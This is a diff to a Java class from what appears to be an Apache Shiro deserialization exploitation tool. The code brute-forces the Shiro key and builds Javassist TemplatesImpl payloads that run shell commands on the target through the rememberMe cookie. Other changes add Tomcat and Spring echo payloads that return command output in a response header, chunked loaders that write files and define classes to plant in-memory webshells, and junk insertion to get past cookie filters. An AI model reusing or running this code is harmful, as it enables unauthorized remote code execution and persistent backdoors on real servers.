@@ -10,11 +10,13 @@ import com.summersec.attack.deser.payloads.ObjectPayload;
 import com.summersec.attack.deser.plugins.keytest.KeyEcho;
 import com.summersec.attack.entity.ControllersFactory;
 import com.summersec.attack.utils.Utils;
+import org.apache.shiro.codec.Base64;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javafx.application.Platform;
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.CtMethod;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.net.Proxy;
@@ -35,7 +37,6 @@ public class HeaderBypassService {
     private Map<String, String> globalHeader;
 
     public String foundKey, foundGadget;
-    private boolean tomcatEchoReady = false;
     private int deleteCount = 0;
 
     public HeaderBypassService() {
@@ -61,8 +62,16 @@ public class HeaderBypassService {
     public boolean isRunning() { return running; }
 
     private boolean checkGadgetReady() {
-        if (foundKey == null || foundKey.isEmpty() || foundGadget == null || foundGadget.isEmpty()) {
-            log("[-] 请先在Header绕过选项卡中爆破密钥和利用链");
+        String key = foundKey;
+        if (key == null || key.isEmpty()) key = mc.shiroKey.getText();
+        if (key == null || key.isEmpty()) {
+            log("[-] 请先获取密钥 (爆破密钥/指定密钥/主标签获取)");
+            return false;
+        }
+        String gadget = foundGadget;
+        if (gadget == null || gadget.isEmpty()) gadget = (String) mc.gadgetOpt.getValue();
+        if (gadget == null || gadget.isEmpty()) {
+            log("[-] 请先爆破利用链");
             return false;
         }
         return true;
@@ -82,13 +91,19 @@ public class HeaderBypassService {
 
     public static String insertJunk(String payload, int maxLen) {
         int budget = maxLen - payload.length();
-        if (budget <= 0) return payload;
-        int interval = Math.max(payload.length() / budget, 2);
+        int interval;
+        if (budget > 0) {
+            interval = Math.max(payload.length() / budget, 2);
+        } else {
+            interval = 10;
+        }
         StringBuilder sb = new StringBuilder();
         for (int i = 0; i < payload.length(); i++) {
             sb.append(payload.charAt(i));
-            if ((i + 1) % interval == 0 && sb.length() + (payload.length() - i - 1) < maxLen)
-                sb.append('$');
+            if ((i + 1) % interval == 0) {
+                if (budget <= 0 || sb.length() + (payload.length() - i - 1) < maxLen)
+                    sb.append('$');
+            }
         }
         return sb.toString();
     }
@@ -98,16 +113,24 @@ public class HeaderBypassService {
     }
 
     private String sendRequest(String cookie, Map<String, String> extraHeaders, String postBody, int reqTimeout) {
+        HttpResponse resp = doSendRequest(cookie, extraHeaders, postBody, reqTimeout);
+        String result = resp.toString();
+        resp.close();
+        return result;
+    }
+
+    private HttpResponse doSendRequest(String cookie, Map<String, String> extraHeaders, String postBody, int reqTimeout) {
+        String fullCookie = cookie;
         HashMap<String, String> headers = new HashMap<>();
-        headers.put("Cookie", cookie);
         if (extraHeaders != null) headers.putAll(extraHeaders);
         if (globalHeader != null && !globalHeader.isEmpty()) {
             for (Map.Entry<String, String> entry : globalHeader.entrySet()) {
                 if ("Cookie".equalsIgnoreCase(entry.getKey()))
-                    headers.put("Cookie", entry.getValue() + "; " + cookie);
+                    fullCookie = entry.getValue() + "; " + cookie;
                 else headers.put(entry.getKey(), entry.getValue());
             }
         }
+        headers.remove("Cookie");
         Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
         HttpRequest req;
         if ("POST".equalsIgnoreCase(httpMethod)) {
@@ -119,13 +142,11 @@ public class HeaderBypassService {
             req = HttpRequest.get(url);
         }
         req.timeout(reqTimeout);
+        req.cookie(fullCookie);
         if (proxy != null) req.setProxy(proxy);
         req.headerMap(headers, true);
         req.setFollowRedirects(false);
-        HttpResponse resp = req.execute();
-        String result = resp.toString();
-        resp.close();
-        return result;
+        return req.execute();
     }
 
     private int countDeleteMe(String text) {
@@ -205,12 +226,12 @@ public class HeaderBypassService {
                             break;
                         }
                         log("[-] " + key);
-                    } catch (Exception e) {
+                    } catch (Throwable e) {
                         log("[-] " + key + " " + e.getMessage());
                     }
                 }
                 log("[*] 密钥爆破结束");
-            } catch (Exception e) {
+            } catch (Throwable e) {
                 log("[-] " + e.getMessage());
             } finally { running = false; }
         }).start();
@@ -260,7 +281,8 @@ public class HeaderBypassService {
             ClassPool pool = ClassPool.getDefault();
             CtClass c = pool.makeClass("V" + System.nanoTime());
             c.setSuperclass(pool.get(AT));
-            c.makeClassInitializer().setBody("{Thread.sleep(" + sleepMs + "L);}");
+            c.makeClassInitializer().setBody("{try{Thread.sleep(" + sleepMs + "L);}catch(Exception e){}}");
+            c.getClassFile().setMajorVersion(50);
             byte[] bytes = c.toBytecode();
             c.detach();
 
@@ -280,7 +302,7 @@ public class HeaderBypassService {
                 return true;
             }
             log("[-] " + gadget + " (" + elapsed + "ms)");
-        } catch (Exception e) {
+        } catch (Throwable e) {
             log("[-] " + gadget + " " + e.getMessage());
         }
         return false;
@@ -299,13 +321,14 @@ public class HeaderBypassService {
                 c.setSuperclass(pool.get(AT));
                 c.makeClassInitializer().setBody(
                     "{Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"});}");
+                c.getClassFile().setMajorVersion(50);
                 byte[] b = c.toBytecode(); c.detach();
                 String enc = encryptBytesToRaw(b, key);
                 String ck = buildCookie(enc);
                 log("[*] 盲执行: " + command + " (cookie_len=" + ck.length() + ")");
                 sendRequest(ck, null, null);
                 log("[+] 已发送");
-            } catch (Exception e) {
+            } catch (Throwable e) {
                 log("[-] " + e.getMessage());
             }
         }).start();
@@ -320,95 +343,89 @@ public class HeaderBypassService {
             try {
                 String escaped = command.replace("\\", "\\\\").replace("\"", "\\\"");
                 ClassPool pool = ClassPool.getDefault();
-                long ts = System.nanoTime();
 
-                if ("Tomcat".equals(echoType) && !tomcatEchoReady) {
-                    CtClass setup = pool.makeClass("S" + ts);
-                    setup.setSuperclass(pool.get(AT));
-                    setup.makeClassInitializer().setBody(
+                CtClass c = pool.makeClass("E" + System.nanoTime());
+                c.setSuperclass(pool.get(AT));
+
+                if ("Tomcat".equals(echoType)) {
+                    c.addMethod(CtMethod.make(
+                        "private static Object g(Object o,String n)throws Exception{"
+                        + "Class c=o.getClass();"
+                        + "while(c!=null){try{java.lang.reflect.Field f=c.getDeclaredField(n);"
+                        + "f.setAccessible(true);return f.get(o);}"
+                        + "catch(Exception e){c=c.getSuperclass();}}return null;}", c));
+                    c.makeClassInitializer().setBody(
                         "{try{"
-                        + "java.lang.reflect.Field wf=Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\");"
-                        + "wf.setAccessible(true);"
-                        + "java.lang.reflect.Field mf=java.lang.reflect.Field.class.getDeclaredField(\"modifiers\");"
-                        + "mf.setAccessible(true);"
-                        + "mf.setInt(wf,wf.getModifiers()&0xFFFFFFEF);"
-                        + "wf.set(null,Boolean.TRUE);"
-                        + "Class afc=Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");"
-                        + "java.lang.reflect.Field lr=afc.getDeclaredField(\"lastServicedRequest\");lr.setAccessible(true);"
-                        + "if(lr.get(null)==null)lr.set(null,new ThreadLocal());"
-                        + "java.lang.reflect.Field ls=afc.getDeclaredField(\"lastServicedResponse\");ls.setAccessible(true);"
-                        + "if(ls.get(null)==null)ls.set(null,new ThreadLocal());"
-                        + "}catch(Exception e){}}");
-                    byte[] bs = setup.toBytecode(); setup.detach();
-                    String encs = encryptBytesToRaw(bs, key);
-                    String cks = buildCookie(encs);
-                    log("[*] Tomcat回显初始化 (cookie_len=" + cks.length() + ")");
-                    sendRequest(cks, null, null);
-                    tomcatEchoReady = true;
-                    Thread.sleep(300);
-                }
-
-                CtClass c1 = pool.makeClass("X" + ts);
-                c1.setSuperclass(pool.get(AT));
-                c1.makeClassInitializer().setBody(
-                    "{try{String[] c;"
-                    + "if(System.getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
-                    + "c=new String[]{\"cmd\",\"/c\",\"" + escaped + "\"};"
-                    + "else c=new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"};"
-                    + "Process p=Runtime.getRuntime().exec(c);"
-                    + "java.io.InputStream is=p.getInputStream();"
-                    + "java.io.ByteArrayOutputStream bo=new java.io.ByteArrayOutputStream();"
-                    + "byte[] bf=new byte[4096];int n;"
-                    + "while((n=is.read(bf))!=-1)bo.write(bf,0,n);"
-                    + "is.close();System.setProperty(\"_o\",bo.toString());"
-                    + "}catch(Exception e){}}");
-                byte[] b1 = c1.toBytecode(); c1.detach();
-                String enc1 = encryptBytesToRaw(b1, key);
-                String ck1 = buildCookie(enc1);
-                log("[*] 回显执行(" + echoType + "): " + command + " (cookie_len=" + ck1.length() + ")");
-                sendRequest(ck1, null, null);
-
-                Thread.sleep(500);
-
-                CtClass c2 = pool.makeClass("R" + ts);
-                c2.setSuperclass(pool.get(AT));
-                if ("Spring".equals(echoType)) {
-                    c2.makeClassInitializer().setBody(
-                        "{try{String o=System.getProperty(\"_o\");"
-                        + "if(o!=null){System.clearProperty(\"_o\");"
-                        + "Object a=Class.forName(\"org.springframework.web.context.request.RequestContextHolder\")"
-                        + ".getMethod(\"currentRequestAttributes\",new Class[0]).invoke(null,new Object[0]);"
-                        + "Object r=a.getClass().getMethod(\"getResponse\",new Class[0]).invoke(a,new Object[0]);"
-                        + "Object w=r.getClass().getMethod(\"getWriter\",new Class[0]).invoke(r,new Object[0]);"
-                        + "w.getClass().getMethod(\"write\",new Class[]{String.class}).invoke(w,new Object[]{\"$$$\"+o+\"$$$\"});"
-                        + "w.getClass().getMethod(\"flush\",new Class[0]).invoke(w,new Object[0]);"
-                        + "}}catch(Exception e){}}");
+                        + "String[] cmd=System.getProperty(\"os.name\").toLowerCase().contains(\"win\")"
+                        + "?new String[]{\"cmd\",\"/c\",\"" + escaped + "\"}"
+                        + ":new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"};"
+                        + "String out=org.apache.shiro.codec.Base64.encodeToString("
+                        + "new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())"
+                        + ".useDelimiter(\"\\\\A\").next().getBytes());"
+                        + "boolean done=false;"
+                        + "Thread[] ts=(Thread[])g(Thread.currentThread().getThreadGroup(),\"threads\");"
+                        + "for(int i=0;i<ts.length&&!done;i++){"
+                        + "if(ts[i]==null)continue;"
+                        + "String n=ts[i].getName();"
+                        + "if(!n.contains(\"exec\")&&n.contains(\"http\")){"
+                        + "Object v=g(ts[i],\"target\");"
+                        + "if(v instanceof Runnable){"
+                        + "try{v=g(g(g(v,\"this$0\"),\"handler\"),\"global\");"
+                        + "java.util.List ps=(java.util.List)g(v,\"processors\");"
+                        + "for(int j=0;j<ps.size()&&!done;j++){"
+                        + "Object req=g(ps.get(j),\"req\");"
+                        + "String h=(String)req.getClass().getMethod(\"getHeader\",new Class[]{String.class}).invoke(req,new Object[]{\"Host\"});"
+                        + "if(h!=null&&!h.isEmpty()){"
+                        + "Object rp=req.getClass().getMethod(\"getResponse\",new Class[0]).invoke(req,new Object[0]);"
+                        + "rp.getClass().getMethod(\"setStatus\",new Class[]{Integer.TYPE}).invoke(rp,new Object[]{new Integer(200)});"
+                        + "rp.getClass().getMethod(\"addHeader\",new Class[]{String.class,String.class}).invoke(rp,new Object[]{\"X-C\",out});"
+                        + "done=true;}}"
+                        + "}catch(Exception e){continue;}"
+                        + "}}}"
+                        + "}catch(Exception e){}}"
+                    );
                 } else {
-                    c2.makeClassInitializer().setBody(
-                        "{try{String o=System.getProperty(\"_o\");"
-                        + "if(o!=null){System.clearProperty(\"_o\");"
-                        + "java.lang.reflect.Field f=Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\")"
-                        + ".getDeclaredField(\"lastServicedResponse\");f.setAccessible(true);"
-                        + "Object resp=((ThreadLocal)f.get(null)).get();"
-                        + "if(resp!=null){Object w=resp.getClass().getMethod(\"getWriter\",new Class[0]).invoke(resp,new Object[0]);"
-                        + "w.getClass().getMethod(\"write\",new Class[]{String.class}).invoke(w,new Object[]{\"$$$\"+o+\"$$$\"});"
-                        + "w.getClass().getMethod(\"flush\",new Class[0]).invoke(w,new Object[0]);}"
-                        + "}}catch(Exception e){}}");
+                    c.makeClassInitializer().setBody(
+                        "{try{"
+                        + "String[] cmd=System.getProperty(\"os.name\").toLowerCase().contains(\"win\")"
+                        + "?new String[]{\"cmd\",\"/c\",\"" + escaped + "\"}"
+                        + ":new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"};"
+                        + "String out=org.apache.shiro.codec.Base64.encodeToString("
+                        + "new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())"
+                        + ".useDelimiter(\"\\\\A\").next().getBytes());"
+                        + "javax.servlet.http.HttpServletResponse rsp="
+                        + "((org.springframework.web.context.request.ServletRequestAttributes)"
+                        + "org.springframework.web.context.request.RequestContextHolder"
+                        + ".getRequestAttributes()).getResponse();"
+                        + "rsp.setHeader(\"X-C\",out);"
+                        + "}catch(Exception e){}}"
+                    );
                 }
-                byte[] b2 = c2.toBytecode(); c2.detach();
-                String enc2 = encryptBytesToRaw(b2, key);
-                String ck2 = buildCookie(enc2);
-                log("[*] 获取回显 (cookie_len=" + ck2.length() + ")");
-                String result = sendRequest(ck2, null, null);
 
-                String[] parts = result.split("\\$\\$\\$");
-                if (parts.length > 1) {
-                    log(parts[1]);
+                byte[] classBytes = toCompatibleBytecode(c);
+                String encrypted = encryptBytesToRaw(classBytes, key);
+                String cookie = buildCookie(encrypted);
+                String obfMsg = obfuscate ? " 已混淆" : "";
+                if (obfuscate && cookie.length() > maxCookieLen) {
+                    obfMsg = " 已混淆 [!]超长" + cookie.length() + ">" + maxCookieLen + ",如失败请取消混淆或增大Cookie限长";
+                }
+                log("[*] 回显执行(" + echoType + "): " + command + " (cookie=" + cookie.length() + obfMsg + ")");
+                HttpResponse resp = doSendRequest(cookie, null, null, timeout);
+                String hv = resp.header("X-C");
+                int status = resp.getStatus();
+                resp.close();
+
+                if (hv != null && !hv.isEmpty()) {
+                    byte[] decoded = Base64.decode(hv);
+                    String output;
+                    try { output = new String(decoded, Utils.guessEncoding(decoded)); }
+                    catch (Exception e) { output = new String(decoded); }
+                    log(output);
                     log("-----------------------------------------------------------------------");
                 } else {
-                    log("[-] 回显失败: 命令已执行但无法获取输出");
+                    log("[-] 未获取到回显 (HTTP " + status + ", 尝试使用盲执行)");
                 }
-            } catch (Exception e) {
+            } catch (Throwable e) {
                 log("[-] " + e.getMessage());
             }
         }).start();
@@ -437,13 +454,14 @@ public class HeaderBypassService {
                 for (int i = 0; i < total && running; i++) {
                     String encrypted = encryptBytesToRaw(payloads.get(i), key);
                     String cookie = buildCookie(encrypted);
-                    sendRequest(cookie, null, null);
-                    log("[+] " + (i + 1) + "/" + total + " cookie_len=" + cookie.length());
+                    String resp = sendRequest(cookie, null, null);
+                    String status = (i == total - 1 && resp.contains("500")) ? " (500是正常现象,内存马触发了response commit)" : "";
+                    log("[+] " + (i + 1) + "/" + total + " cookie_len=" + cookie.length() + status);
                     if (i < total - 1 && running) Thread.sleep(delay);
                 }
-                if (running) log("[+] 发送完成！请验证内存马");
+                if (running) log("[+] 发送完成！请验证内存马连接");
                 else log("[!] 已停止");
-            } catch (Exception e) {
+            } catch (Throwable e) {
                 log("[-] " + e.getMessage());
             } finally { running = false; }
         }).start();
@@ -532,6 +550,13 @@ public class HeaderBypassService {
         f.set(obj, value);
     }
 
+    private static byte[] toCompatibleBytecode(CtClass c) throws Exception {
+        c.getClassFile().setMajorVersion(50);
+        byte[] b = c.toBytecode();
+        c.detach();
+        return b;
+    }
+
     private List<byte[]> genFileWrite(String b64, int gs, String path) throws Exception {
         List<byte[]> r = new ArrayList<>();
         ClassPool pool = ClassPool.getDefault();
@@ -547,7 +572,7 @@ public class HeaderBypassService {
                 "{try{java.io.FileOutputStream fos=new java.io.FileOutputStream(\"" + fp + "\"," + (a > 1) + ");"
                 + "fos.write(\"" + chunk + "\".getBytes(\"UTF-8\"));fos.close();"
                 + "}catch(Exception e){}}");
-            r.add(c.toBytecode()); c.detach(); si = ei; a++;
+            r.add(toCompatibleBytecode(c)); si = ei; a++;
         }
         CtClass ld = pool.makeClass("FWL" + ts); ld.setSuperclass(pool.get(AT));
         ld.makeClassInitializer().setBody(
@@ -559,7 +584,7 @@ public class HeaderBypassService {
             + "dc.setAccessible(true);"
             + "((Class)dc.invoke(Thread.currentThread().getContextClassLoader(),new Object[]{cb,new Integer(0),new Integer(cb.length)})).newInstance();"
             + "f.delete();}catch(Exception e){}}");
-        r.add(ld.toBytecode()); ld.detach();
+        r.add(toCompatibleBytecode(ld));
         return r;
     }
 
@@ -568,8 +593,8 @@ public class HeaderBypassService {
         ClassPool pool = ClassPool.getDefault();
         long ts = System.currentTimeMillis();
         CtClass init = pool.makeClass("TN" + ts + "_0"); init.setSuperclass(pool.get(AT));
-        init.makeClassInitializer().setBody("Thread.currentThread().setName(\"Test\");");
-        r.add(init.toBytecode()); init.detach();
+        init.makeClassInitializer().setBody("{try{Thread.currentThread().setName(\"Test\");}catch(Exception e){}}");
+        r.add(toCompatibleBytecode(init));
         int len = b64.length(), si = 0, a = 1;
         while (si < len) {
             int ei = Math.min(si + gs, len);
@@ -583,7 +608,7 @@ public class HeaderBypassService {
                 + "Thread z = o[i]; if (z != null && z.getName().contains(\"Test\")){"
                 + "z.setName(z.getName()+\"" + chunk + "\");"
                 + "}}} catch (Exception e){}}");
-            r.add(c.toBytecode()); c.detach(); si = ei; a++;
+            r.add(toCompatibleBytecode(c)); si = ei; a++;
         }
         CtClass ld = pool.makeClass("TNL" + ts); ld.setSuperclass(pool.get(AT));
         ld.makeClassInitializer().setBody(
@@ -599,7 +624,7 @@ public class HeaderBypassService {
             + "((Class)dc.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{cb, new Integer(0), new Integer(cb.length)})).newInstance();"
             + "ts[i].setName(\"http-nio-exec-1\");break;}}"
             + "} catch(Exception e){}}");
-        r.add(ld.toBytecode()); ld.detach();
+        r.add(toCompatibleBytecode(ld));
         return r;
     }
 
@@ -612,8 +637,8 @@ public class HeaderBypassService {
             int ei = Math.min(si + gs, len);
             String chunk = b64.substring(si, ei);
             CtClass c = pool.makeClass("SP" + ts + "_" + a); c.setSuperclass(pool.get(AT));
-            c.makeClassInitializer().setBody("System.setProperty(\"" + a + "\",\"" + chunk + "\");");
-            r.add(c.toBytecode()); c.detach(); si = ei; a++;
+            c.makeClassInitializer().setBody("{try{System.setProperty(\"" + a + "\",\"" + chunk + "\");}catch(Exception e){}}");
+            r.add(toCompatibleBytecode(c)); si = ei; a++;
         }
         CtClass ld = pool.makeClass("SPL" + ts); ld.setSuperclass(pool.get(AT));
         ld.makeClassInitializer().setBody(
@@ -625,7 +650,7 @@ public class HeaderBypassService {
             + "((Class)dc.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{cb, new Integer(0), new Integer(cb.length)})).newInstance();"
             + "for(int j=1;;j++){if(System.getProperty(\"\"+j)==null) break;System.clearProperty(\"\"+j);}"
             + "} catch(Exception e){}}");
-        r.add(ld.toBytecode()); ld.detach();
+        r.add(toCompatibleBytecode(ld));
         return r;
     }
 
